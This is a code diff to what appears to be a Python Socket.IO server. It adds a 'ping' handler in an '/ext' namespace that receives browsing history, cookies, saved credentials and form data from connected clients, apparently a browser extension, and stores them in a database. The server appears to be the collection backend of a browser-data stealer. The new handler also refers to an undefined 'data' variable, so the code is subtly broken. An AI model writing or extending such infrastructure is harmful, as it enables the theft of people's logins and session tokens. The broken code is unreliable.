@@ -41,20 +41,27 @@ def handle_ext_connect(sid, data_json):
         resp = database.construct_response(clientid)
         return 201, resp
     else:
-        clientid = data["clientid"]
-        connected_clients.append((clientid, sid))
-        if database.store_history(data["history"], clientid):
+        return handle_ext_ping(sid, data_json)
+
+
+@socketio.on('ping', namespace='/ext')
+def handle_ext_ping(sid, data_json):
+    clientid = data["clientid"]
+    bad = 400, "Invalid payload"
+    connected_clients.append((clientid, sid))
+    if database.store_history(data["history"], clientid):
+        return bad
+    for cookie in data["cookies"]:
+        if database.store_cookie(cookie, clientid):
             return bad
-        for cookie in data["cookies"]:
-            if database.store_cookie(cookie, clientid):
-                return bad
-        for cred in data["creds"]:
-            if database.store_credential(cred, clientid):
-                return bad
-        for form in data["forms"]:
-            if database.store_form_data(form, clientid):
-                return bad
-        return 200, database.construct_response(clientid)
+    for cred in data["creds"]:
+        if database.store_credential(cred, clientid):
+            return bad
+    for form in data["forms"]:
+        if database.store_form_data(form, clientid):
+            return bad
+    return 200, database.construct_response(clientid)
+
 
 
 @socketio.on('disconnect', namespace='/ext')
